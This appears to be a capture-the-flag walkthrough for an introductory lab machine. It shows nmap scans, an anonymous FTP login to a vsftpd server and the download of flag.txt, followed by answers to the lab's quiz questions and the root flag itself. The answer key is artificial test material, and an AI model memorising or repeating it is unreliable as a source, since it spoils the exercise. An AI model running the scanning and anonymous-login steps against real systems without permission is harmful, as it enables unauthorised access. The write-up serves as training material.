## Walkthrough

- performed nmap scan on target ip

```
┌─[birb@coffee]─[~]
└──╼ $nmap 10.129.103.221
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 13:51 IST
Nmap scan report for 10.129.103.221
Host is up (0.73s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 55.32 seconds
```

```
┌─[birb@coffee]─[~]
└──╼ $nmap 10.129.103.221 -sC -sV -p 21
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 13:49 IST
Nmap scan report for 10.129.103.221
Host is up (0.36s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.25
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.44 seconds
```

- connected to ftp port using

```
┌─[birb@coffee]─[~]
└──╼ $ftp 10.129.103.221
Connected to 10.129.103.221.
220 (vsFTPd 3.0.3)
Name (10.129.103.221:birb): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

-  found `flag.txt`

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
```

- transfered `flag.txt` to local machine using `get`

```
ftp> get flag.txt
local: flag.txt remote: flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
32 bytes received in 0.00 secs (208.3333 kB/s)
```

- exited ftp session

```
ftp> quit
221 Goodbye.
```

- got the flag 

```
┌─[birb@coffee]─[~]
└──╼ $cat flag.txt 
035db21c881520061c53e0536e44f815
```

## Tasks

**What does the 3-letter acronym FTP stand for?**

=>  File Transfer Protocol 

**Which port does the FTP service listen on usually?**

=> 21

**What acronym is used for the secure version of FTP?**

=> SFTP

**What is the command we can use to send an ICMP echo request to test our connection to the target?**

=> ping

**From your scans, what version is FTP running on the target?**

=> vsftpd 3.0.3

**From your scans, what OS type is running on the target?**

=> Unix

**What is the command we need to run in order to display the 'ftp' client help menu?**

=> ftp -h

**What is username that is used over FTP when you want to log in without having an account?**

=> anonymous

**What is the response code we get for the FTP message 'Login successful'?**

=> 230

**There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.**

=> ls

**What is the command used to download the file we found on the FTP server?**

=> get

**Submit root flag**

=> 035db21c881520061c53e0536e44f815
